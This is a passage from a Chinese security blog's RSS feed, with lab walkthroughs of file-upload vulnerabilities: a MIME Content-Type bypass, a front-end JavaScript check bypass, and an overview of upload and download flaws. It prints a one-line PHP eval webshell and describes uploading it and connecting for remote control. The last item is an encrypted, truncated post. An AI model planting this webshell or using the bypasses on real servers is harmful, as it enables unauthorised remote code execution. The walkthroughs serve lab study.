&lt;li&gt;&lt;code&gt;type&lt;/code&gt;表示可以被分多个子类的独立类别。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;subtype&lt;/code&gt;表示细分后的每个类型&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;独立类型如下&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;text/plain&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;text/html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image/jpeg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;image/png&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio/mpeg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio/ogg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;audio/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;video/mp4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;application/*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;application/javascript&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;application/ecmascript&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;application/octet-stream&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;…&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003135647652.png&#34; alt=&#34;image-20221003135647652&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传文件的时候，Content-Type有两类标识：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标识文件上传的请求 multipart/form-data【可用于&lt;code&gt;HTML表单&lt;/code&gt;从浏览器发送信息给服务器】&lt;/li&gt;
&lt;li&gt;标识文件类型 application/octet-stream 【这是应用程序文件的默认值。意思是&lt;code&gt;未知的应用程序文件&lt;/code&gt;，浏览器一般不会自动执行或询问执行】&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;了解了基本上传格式后，查看源码内容【单击“显示源码”按钮】&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003140629128.png&#34; alt=&#34;image-20221003140629128&#34;&gt;&lt;/p&gt;
&lt;p&gt;这一段的主要逻辑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义&lt;code&gt;$is_upload&lt;/code&gt;变量，默认值为false&lt;/li&gt;
&lt;li&gt;定义&lt;code&gt;$msg&lt;/code&gt;变量，默认值为空&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;isset&lt;/code&gt;函数判断&lt;code&gt;submit的POST请求&lt;/code&gt;是否为空&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果为空，什么都不做&lt;/li&gt;
&lt;li&gt;如果不为空，则继续往下走&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;判断&lt;code&gt;UPLOAD_PATH&lt;/code&gt;上传目录是否存在&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果不存在，则返回“文件夹不存在，请手工创建”&lt;/li&gt;
&lt;li&gt;如果存在，则继续往下走&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;判断&lt;code&gt;upload_file&lt;/code&gt;的type的字段的值是否为 image/jpeg 、png、gif中的任意一个&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果不是，则返回”文件类型不正确，请重新上传”&lt;/li&gt;
&lt;li&gt;如果是，则继续往下走&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;定义一个&lt;code&gt;$temp_file&lt;/code&gt;变量，接收&lt;code&gt;upload_file&lt;/code&gt;的&lt;code&gt;tmp_name&lt;/code&gt;字段的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;$ _FILES [&amp;#39;upload_file&amp;#39;]&lt;/code&gt;表示内置名为&lt;code&gt;upload_file&lt;/code&gt;的&lt;code&gt;FILES数组&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;pre&gt;&lt;code class=&#34;lang-php&#34;&gt;PHP $_FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。
如果为单个文件上传，那么 $_FILES 为二维数组；
如果为多个文件上传，那么 $_FILES 为三维数组。
$_FILES数组内容如下: 
$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;name&amp;#39;] 客户端文件的原名称。 
$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;type&amp;#39;] 文件的 MIME 类型，需要浏览器提供该信息的支持，例如&amp;quot;image/gif&amp;quot;。 
$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;size&amp;#39;] 已上传文件的大小，单位为字节。 
$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;tmp_name&amp;#39;] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但用putenv() 函数设置是不起作用的。 
$_FILES[&amp;#39;upload_file&amp;#39;][&amp;#39;error&amp;#39;] 和该文件上传相关的错误代码。[&amp;#39;error&amp;#39;] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量)
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;定义一个img_path变量，接收UPLOAD_PATH+’/‘+upload_file关联信息中name字段的值&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;[&amp;#39;name&amp;#39;]&lt;/code&gt;是表示&lt;code&gt;文件&amp;quot;在上传者机器上&amp;quot;的文件名&lt;/code&gt; ，或者叫&lt;code&gt;客户端文件的原名称&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;判断&lt;code&gt;move_uploaded_file&lt;/code&gt;的返回值，其函数原型为&lt;code&gt;move_uploaded_file( string file, string dest)&lt;/code&gt;，意为&lt;code&gt;将上传的file移动到dest&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果临时文件&lt;code&gt;$temp_file&lt;/code&gt;成功移动到&lt;code&gt;$img_path&lt;/code&gt;当中【&lt;strong&gt;相当于linux的mv指令&lt;/strong&gt;】，那么就令&lt;code&gt;$is_upload&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;，并返回”上传Success！”&lt;/li&gt;
&lt;li&gt;如果没有移动成功，则返回“上传出错！”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;content-type绕过&#34;&gt;&lt;a href=&#34;#content-type绕过&#34; class=&#34;headerlink&#34; title=&#34;content-type绕过&#34;&gt;&lt;/a&gt;content-type绕过&lt;/h2&gt;&lt;p&gt;抓包后将&lt;code&gt;Content-type字段的值&lt;/code&gt;修改为&lt;code&gt;image/jpeg&lt;/code&gt;、&lt;code&gt;image/png&lt;/code&gt;、&lt;code&gt;image/gif&lt;/code&gt;的任何一种即可实现绕过。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003144019576.png&#34; alt=&#34;image-20221003144019576&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改如下&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003144200588.png&#34; alt=&#34;image-20221003144200588&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;点击Forward，提示”上传Success！”&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003144223909.png&#34; alt=&#34;image-20221003144223909&#34;&gt;&lt;/p&gt;
&lt;p&gt;至此，content-type验证审计+绕过演示完毕。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</guid>
            <title>前台JS验证审计+绕过</title>
            <link>https://kiyomijin.github.io/2022/10/03/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%8E%A2%E7%A9%B6/%E5%89%8D%E5%8F%B0JS%E9%AA%8C%E8%AF%81%E5%AE%A1%E8%AE%A1+%E7%BB%95%E8%BF%87/</link>
            <category>文件上传漏洞探究</category>
            <pubDate>Mon, 03 Oct 2022 00:34:47 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;文件上传漏洞&#34;&gt;&lt;a href=&#34;#文件上传漏洞&#34; class=&#34;headerlink&#34; title=&#34;文件上传漏洞&#34;&gt;&lt;/a&gt;文件上传漏洞&lt;/h1&gt;&lt;p&gt;在讲前台JS绕过之前，由于是文件上传漏洞探究系列的第一讲，先来简单介绍一下文件上传漏洞。&lt;/p&gt;
&lt;h2 id=&#34;文件上传漏洞的原因&#34;&gt;&lt;a href=&#34;#文件上传漏洞的原因&#34; class=&#34;headerlink&#34; title=&#34;文件上传漏洞的原因&#34;&gt;&lt;/a&gt;文件上传漏洞的原因&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;对于上传文件的后缀名(扩展名)没有做较为严格的限制&lt;/li&gt;
&lt;li&gt;对于上传文件的MIMETYPE(content-type，用于描述文件类型的一种描述方法)，没有做检查&lt;/li&gt;
&lt;li&gt;权限上没有对于上传的文件目录设置不可执行权限&lt;/li&gt;
&lt;li&gt;web server对于上传文件或者指定目录的行为没有做限制。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​    在Web中进行文件上传的原理是通过将表单设置为&lt;code&gt;multipart/form-data&lt;/code&gt;，同时加入文件域，而后通过HTTP协议将文件内容发送到服务器，服务器端读取这个分段（&lt;strong&gt;multipart&lt;/strong&gt;）的数据信息，并将其中的文件内容提取出来并保存。&lt;/p&gt;
&lt;p&gt;​    通常，在进行文件保存的时候，服务器端会读取文件的原始文件名，并从这个原始文件名中得出文件的扩展名，而后随机为文件起一个文件名（为了防止重复），并且加上原始文件的扩展名来保存到服务器上。&lt;/p&gt;
&lt;h2 id=&#34;文件上传漏洞的危害&#34;&gt;&lt;a href=&#34;#文件上传漏洞的危害&#34; class=&#34;headerlink&#34; title=&#34;文件上传漏洞的危害&#34;&gt;&lt;/a&gt;文件上传漏洞的危害&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;上传web木马文件、控制web服务器文件、远程命令执行等&lt;/li&gt;
&lt;li&gt;上传系统病毒、木马文件进行挖矿、僵尸网络&lt;/li&gt;
&lt;li&gt;上传系统溢出程序进行权限提升&lt;/li&gt;
&lt;li&gt;修改web页面实现钓鱼、挂马、暗链等操作&lt;/li&gt;
&lt;li&gt;内网渗透&lt;/li&gt;
&lt;li&gt;在权限得到提升的情况下，想做什么就做什么&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件上传合法性检测方法&#34;&gt;&lt;a href=&#34;#文件上传合法性检测方法&#34; class=&#34;headerlink&#34; title=&#34;文件上传合法性检测方法&#34;&gt;&lt;/a&gt;文件上传合法性检测方法&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;前端Js验证&lt;/li&gt;
&lt;li&gt;MIME类型验证&lt;/li&gt;
&lt;li&gt;黑名单/白名单&lt;/li&gt;
&lt;li&gt;检查文件内容(getimagesize()函数用于获取图像信息、校验关键字)&lt;/li&gt;
&lt;li&gt;禁止本地文件包含漏洞&lt;/li&gt;
&lt;li&gt;使用安全的web服务(Apache、nginx(/test.png/xxx.php)、IIS解析漏洞(1.php;jpg))&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件上传漏洞8种常见绕过方法&#34;&gt;&lt;a href=&#34;#文件上传漏洞8种常见绕过方法&#34; class=&#34;headerlink&#34; title=&#34;文件上传漏洞8种常见绕过方法&#34;&gt;&lt;/a&gt;文件上传漏洞8种常见绕过方法&lt;/h2&gt;&lt;p&gt;（整体会有20多种，这里列举常见8种）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前端Js绕过&lt;/li&gt;
&lt;li&gt;MIME类型绕过&lt;/li&gt;
&lt;li&gt;后缀名大小写绕过/ php4、php5&lt;/li&gt;
&lt;li&gt;00截断&lt;/li&gt;
&lt;li&gt;覆盖.htaccess&lt;/li&gt;
&lt;li&gt;Windows文件流特性绕过&lt;/li&gt;
&lt;li&gt;双写文件名绕过&lt;/li&gt;
&lt;li&gt;条件竞争&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;文件下载漏洞概念&#34;&gt;&lt;a href=&#34;#文件下载漏洞概念&#34; class=&#34;headerlink&#34; title=&#34;文件下载漏洞概念&#34;&gt;&lt;/a&gt;文件下载漏洞概念&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;一些网站由于业务需求，往往需要提供文件查看或文件下载功能，但若对用户查看或下载的文件不做限制，则恶意用户就能够查看或下载任意敏感文件，这就是文件查看与下载漏洞。&lt;/li&gt;
&lt;li&gt;下载服务器任意文件，如脚本代码、服务及系统配置文件等可用得到的代码进一步做代码审计，得到更多可利用漏洞。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;如何查找任意文件下载漏洞呢？&#34;&gt;&lt;a href=&#34;#如何查找任意文件下载漏洞呢？&#34; class=&#34;headerlink&#34; title=&#34;如何查找任意文件下载漏洞呢？&#34;&gt;&lt;/a&gt;如何查找任意文件下载漏洞呢？&lt;/h2&gt;&lt;p&gt;查找传入文件名的参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;导入文件等参数，要是直接输入文件名，就有可能有注入点。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;注意如下几个参数名：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RealPath, FilePath, filepath, Path, path, inputFile, url, urls, Lang, dis, data, readfile, filep&lt;/li&gt;
&lt;li&gt;src, menu, META-INF, WEB-INF&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;代码中如何查找漏洞：&lt;/p&gt;
&lt;p&gt;PHP为例，有如下代码，就有可能存在任意文件下载漏洞&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;readfile&lt;/li&gt;
&lt;li&gt;fopen&lt;/li&gt;
&lt;li&gt;file_get_contents&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;Windows敏感文件路径&#34;&gt;&lt;a href=&#34;#Windows敏感文件路径&#34; class=&#34;headerlink&#34; title=&#34;Windows敏感文件路径&#34;&gt;&lt;/a&gt;Windows敏感文件路径&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image-20221003011837881.png&#34; alt=&#34;image-20221003011837881&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;Linux敏感文件路径&#34;&gt;&lt;a href=&#34;#Linux敏感文件路径&#34; class=&#34;headerlink&#34; title=&#34;Linux敏感文件路径&#34;&gt;&lt;/a&gt;Linux敏感文件路径&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;image-20221003011901170.png&#34; alt=&#34;image-20221003011901170&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;修复文件下载漏洞&#34;&gt;&lt;a href=&#34;#修复文件下载漏洞&#34; class=&#34;headerlink&#34; title=&#34;修复文件下载漏洞&#34;&gt;&lt;/a&gt;修复文件下载漏洞&lt;/h2&gt;&lt;p&gt;PHP为例：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;过滤.(点)，使用户在url种不能回溯上级目录&lt;/li&gt;
&lt;li&gt;正则严格判断用户输入参数的格式&lt;/li&gt;
&lt;li&gt;php.ini配置open_basedir限定文件访问范围&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;OK，进入主题&lt;/p&gt;
&lt;h1 id=&#34;配置虚拟主机&#34;&gt;&lt;a href=&#34;#配置虚拟主机&#34; class=&#34;headerlink&#34; title=&#34;配置虚拟主机&#34;&gt;&lt;/a&gt;配置虚拟主机&lt;/h1&gt;&lt;p&gt;虚拟主机，能够将我们的多个apache做成域名的方式访问。&lt;/p&gt;
&lt;p&gt;打开phpStudyB\Apache\conf\httpd.conf文件，一共修改两处：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;取消LoadModule 关于vhost_alias的注释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113249079.png&#34; alt=&#34;image-20221003113249079&#34;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;取消Virtual hosts的Include所在行注释&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113333330.png&#34; alt=&#34;image-20221003113333330&#34;&gt;&lt;/p&gt;
&lt;p&gt;再打开C:\phpStudyB\Apache\conf\extra\httpd-vhosts.conf文件&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003113809255.png&#34; alt=&#34;image-20221003113809255&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来就是重启phpStudy就行了。&lt;/p&gt;
&lt;h1 id=&#34;一句话木马&#34;&gt;&lt;a href=&#34;#一句话木马&#34; class=&#34;headerlink&#34; title=&#34;一句话木马&#34;&gt;&lt;/a&gt;一句话木马&lt;/h1&gt;&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[abcd]);&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;简而言之，就是只有一句代码的木马。@eval就是执行一些传的参数命令，$_POST接收我们的POST请求，参数的名称是abcd。总之，就是可以&lt;code&gt;执行&lt;/code&gt;我们发送的带参数的命令请求。&lt;/p&gt;
&lt;p&gt;功能是实现：数据库管理、生成虚拟终端、文件管理。&lt;/p&gt;
&lt;h1 id=&#34;前台JS验证审计-绕过&#34;&gt;&lt;a href=&#34;#前台JS验证审计-绕过&#34; class=&#34;headerlink&#34; title=&#34;前台JS验证审计+绕过&#34;&gt;&lt;/a&gt;前台JS验证审计+绕过&lt;/h1&gt;&lt;h2 id=&#34;前台Js验证审计&#34;&gt;&lt;a href=&#34;#前台Js验证审计&#34; class=&#34;headerlink&#34; title=&#34;前台Js验证审计&#34;&gt;&lt;/a&gt;前台Js验证审计&lt;/h2&gt;&lt;p&gt;上传backdoor.php(含有一句话木马)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124200976.png&#34; alt=&#34;image-20221003124200976&#34;&gt;&lt;/p&gt;
&lt;p&gt;ok，我们开始抓包&lt;/p&gt;
&lt;p&gt;启动BurpSuit，intercept on，结果再次点击上传按钮，却没有抓到任何的包&lt;/p&gt;
&lt;p&gt;我们F12看源码进行代码审计&lt;/p&gt;
&lt;h3 id=&#34;上传按钮代码审计&#34;&gt;&lt;a href=&#34;#上传按钮代码审计&#34; class=&#34;headerlink&#34; title=&#34;上传按钮代码审计&#34;&gt;&lt;/a&gt;上传按钮代码审计&lt;/h3&gt;&lt;p&gt;首先我们知道，重要的上传逻辑肯定在这些字样的附近：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124524219.png&#34; alt=&#34;image-20221003124524219&#34;&gt;&lt;/p&gt;
&lt;p&gt;那么我们找到”&lt;strong&gt;上传区&lt;/strong&gt;“、”&lt;strong&gt;请选择要上传的图片&lt;/strong&gt;“这个字样，就能精准定位到相关源码附近。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003124332517.png&#34; alt=&#34;image-20221003124332517&#34;&gt;&lt;/p&gt;
&lt;p&gt;上面一段代码的主要逻辑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;属于&lt;code&gt;form&lt;/code&gt;数据，使用&lt;code&gt;POST&lt;/code&gt;请求&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;有&lt;strong&gt;两个&lt;/strong&gt;输入&lt;code&gt;input&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;一个是input_file，类型是&lt;code&gt;file&lt;/code&gt;，命名为upload_file，意为待上传的文件。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;一个是button，类型是&lt;code&gt;submit&lt;/code&gt;，命名为submit，按钮名称为“上传”&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;form&lt;/code&gt;请求在点击submit时&lt;strong&gt;会触发的方法&lt;/strong&gt;——&lt;code&gt;onsubmit&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;return checkFile()：属于&lt;code&gt;JavaScript(简称Js)&lt;/code&gt;语法，意为将会调用&lt;code&gt;checkFile()&lt;/code&gt;，并将其结果返回&lt;/li&gt;
&lt;li&gt;&lt;code&gt;onsubmit&lt;/code&gt;就是在提交之前&lt;strong&gt;验证上传文件的合法性，属于前端验证&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;好的，继续来看一下关键的&lt;code&gt;checkFile()&lt;/code&gt;函数都干了什么：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003125613717.png&#34; alt=&#34;image-20221003125613717&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;checkFile()函数主要逻辑：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过&lt;code&gt;getElementsByName()&lt;/code&gt;函数，参数为&lt;code&gt;upload_file&lt;/code&gt;来获取其数组中第一个元素值(下标从0开始)——也就是&lt;strong&gt;upload_file对应的文件&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;如果&lt;code&gt;upload_file对应的文件&lt;/code&gt;为空，那么就弹出”请选择要上传的文件！”&lt;/li&gt;
&lt;li&gt;&lt;p&gt;如果非空，则继续往下走&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;定义了允许上传的文件类型为“.jpg| .png| .gif”&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;通过lastIndexOf函数获取&lt;code&gt;最后一个.&lt;/code&gt;出现的位置进行截取字符串，获得的是&lt;code&gt;最后一个.&lt;/code&gt;右边的字符串——&lt;strong&gt;获得上传文件后缀名&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;判断&lt;code&gt;上传文件后缀名&lt;/code&gt;是否在刚刚定义的类型里面&lt;ul&gt;
&lt;li&gt;如果不在则弹出“该文件不允许上传……”，并return &lt;code&gt;false&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;否则return &lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;前台Js验证绕过&#34;&gt;&lt;a href=&#34;#前台Js验证绕过&#34; class=&#34;headerlink&#34; title=&#34;前台Js验证绕过&#34;&gt;&lt;/a&gt;前台Js验证绕过&lt;/h2&gt;&lt;p&gt;我们再次刷新上传页面，使用BurpSuit抓到页面返回的源码信息&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130553004.png&#34; alt=&#34;image-20221003130553004&#34;&gt;&lt;/p&gt;
&lt;p&gt;直接找到刚刚定位的checkFile()函数，将其内容改成&lt;code&gt;return true;&lt;/code&gt;，意为&lt;strong&gt;无论什么文件，恒返回真&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130644011.png&#34; alt=&#34;image-20221003130644011&#34;&gt;&lt;/p&gt;
&lt;p&gt;点击”Forward”按钮。&lt;/p&gt;
&lt;p&gt;然后上传我们的一句话木马，backdoor.php，点击“上传”，之后就可以成功抓到包。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130804344.png&#34; alt=&#34;image-20221003130804344&#34;&gt;&lt;/p&gt;
&lt;p&gt;之后一顿Forward，提交过去。&lt;/p&gt;
&lt;p&gt;显示了我们上传的php，即上传成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221003130947145.png&#34; alt=&#34;image-20221003130947145&#34;&gt;&lt;/p&gt;
&lt;p&gt;我们使用中国菜刀连接获取webshell即可。&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</guid>
            <title>SQL注入防御</title>
            <link>https://kiyomijin.github.io/2022/10/03/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/SQL%E6%B3%A8%E5%85%A5%E9%98%B2%E5%BE%A1/</link>
            <category>SQL注入探究</category>
            <pubDate>Mon, 03 Oct 2022 00:01:22 +0800</pubDate>
            <description><![CDATA[ &lt;div class=&#34;hbe hbe-container&#34; id=&#34;hexo-blog-encrypt&#34; data-wpm=&#34;Oh, this is an invalid password. Check and try again, please.&#34; data-whm=&#34;OOPS, these decrypted content may changed, but you can still have a look.&#34;&gt;
  &lt;script id=&#34;hbeData&#34; type=&#34;hbeData&#34; data-hmacdigest=&#34;d8738492a3eace68e96354c22949b135ae9c2ba1fb925ed5958626ce525a8ec0&#34;&gt;881d2a9d793d5558f4c5d7fc62042411cf78789d816c07caf10e349ab53763fc5d13120843a9e21c92b2b88c68f041cce14a1640542f96b1108b53d559d0a58529fc681accd2f9c73a50648cdc0d43c51eb6cea7795993f95cac630ae2147fc035510f34e55c4077d034ad7912944b09fd6952d24abc6b21b93aa1a7a28759cac09f58bade1d4107c942c466d45b3e87ac6636ff97d567ea1420c8e65ff532ef4b5644362a165b27041829260e50a95d66ab05f71091b3f5045fd9dd8478a54ecd13548587cb02d751a99678cdb86f3a11acd48d136cc836a3cc5cd5fee9b9eb2fa7e652a9a051ffa9a9e7b2faef930359d6e16a60e93926fb723087f2d14a85375781a65eff272dd196b80797a8ff9a797675fa4b344b22591c89fc139b5a08e43370f78c72e4c90b2b3925931644511c0ad528e6f879ee94c71fe65c1a75b8aa69d37b41f6b24ad6b813de28c70ce506c3872d1fb05ba5f7c465910826ff6f6896a652d15203b97a894b90a3ec3f0141aad4f01d45f209648de9db4e7bce43d282e726140df63cb0ca03b143a0cea0a4cf32deebc608b49397c9d142aa86e88378e09500fa1bd107d2649640e9311eca4d8c59e5e26459378f0037a927da3864e08c347d619a6401ab7a4e0c106cd345c72c91b7b1b22f96077192556e30ad854fe7f1dad83efbd7bb6f27c467c18058fa329d6a76f0072745dcc86df72d956eb00a563334b18267f405d6d34dce99b8f998c4bed90161d98e9bee72cd001bc26d9926cfac99e96b9b2faa7c6db7810e46387848565e8037560981acdccd0c1d5fd3324a0d91f3450fe13c882ec85f97a1d07af6f051195efcab7e974778d84a4525ad602b4fdacb980409cf3f92f633bd2911d17c8d1af32325c5d797cf06e02b7c89fbbf298760b36e803d86139e72e1584e15697d50dc7fa132187f736e554242236b59eea2f67208eac4799a167b210a059ec2a5ec0cd48341f9a67fd5ff5ce45082d07fe309aaa4c30aabe4c6ce8ba3e6bf8ba0f239a8706a35af1ae96b87cefd28cb9bd959f232c2a94834ea98dc87d9a8117f24ce959f9cd03f074766596fc7101771d1a4b71795584ff95975432369ccd437ac85757350505c7ab7d21f21726d1fa4a79dbe3bff97c09ee1b9c53d1b8e1e2b095d28aec63aa54d041f635440e2963fbadbd824487c5c5ee9d69120a08b2a277af3832a9ca2ebd078d9b7957b250d038ba5804680c267353359f10d9055880d64c751aeaf64336c053d48b0116445377f1ccdcf3b247c09132146651338724663667b850e9e444c0d78adb311daafea4719346654c37998ff68dafd2c887754cfabeb367d38aa6ed3940b9e07d7e44634592d2c7329cddfc9eb906be5d2d139c29951b9ed2806d132298cd2eb7e5b7095bc589fbb61f85831b83f41d4d9f4005944f8c5f14cac81327f175f94326a90bf6de039d7357f0b75fddce3d0cb5ac48e30f89204f7fcb48527cd1035e6110dd9aa7de164aa965ff1ec26383f4f721e1d63131996a60a4df71297d91499da15d11415fc49e74a7382e29f46671d1c6c26f9bc4007d26ac28cfb46e442d26281ed1787167aa40556dcd0e894e7b1db9c8dbae6ce0b5d698842f73492d1fc05d2c0c1c66a43c41369624abd720fea7aedb9d7e9a9b1d9ed0f53c622a277469e1e3975c840f056b54a8e289cd245f79abba07ccfb21e2dfb0c59dc60e75efb5a8826815d464d774b967fd62aea6bfee4a9083c3165ebe3f5f828dfe0e3e5e7f20b1e02c5e1bd98529ede8b2265f5eac4e534b27371782d9cb61bbf348b2c71a70ed4d68f645dd97069191e1520bd173662510920f6cc4e30acbabf1baef636dc0b138392a463e5b5de608ddc1b8168a3120a6fc347c49e5ff39a0a17f698cf1